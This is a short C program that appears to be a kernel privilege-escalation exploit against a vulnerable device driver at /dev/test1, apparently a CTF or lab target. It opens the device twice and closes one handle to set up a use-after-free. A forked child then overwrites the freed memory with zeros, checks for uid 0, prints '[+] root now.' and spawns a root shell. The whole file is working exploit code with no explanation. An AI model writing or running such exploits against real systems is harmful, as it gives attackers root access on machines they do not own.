#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <fcntl.h>
#include <string.h>
#include <sys/wait.h>


int main(){
    char *buf = malloc(0x1000);
    
    int fd = open("/dev/test1", 6);
    if (fd < 0){
        perror("open");
        exit(0);
    }
   
    int fd2 = open("/dev/test1", 6);
    if (fd2 < 0){
        perror("open2");
        exit(0);
    }

    if (write(fd2, buf, 0x8a) < 0){
        perror("write2");
    }
    if (read(fd2, buf, 0x8a) < 0){
        perror("read2");
    }
    close(fd2);

    int pid = fork();
	if(pid < 0)
	{
		perror("fork");
		exit(0);
	}
	else if(pid == 0)
	{
        for (int i=0; i<0x28;i++){
            buf[i]=0;
        }

        if (write(fd, buf, 0x28) < 0){
            perror("write");
        }

		if(getuid() == 0)
		{
			puts("[+] root now.");
			system("/bin/sh");
		}
	}
    else{
        wait(NULL);
    }


    return 0;
}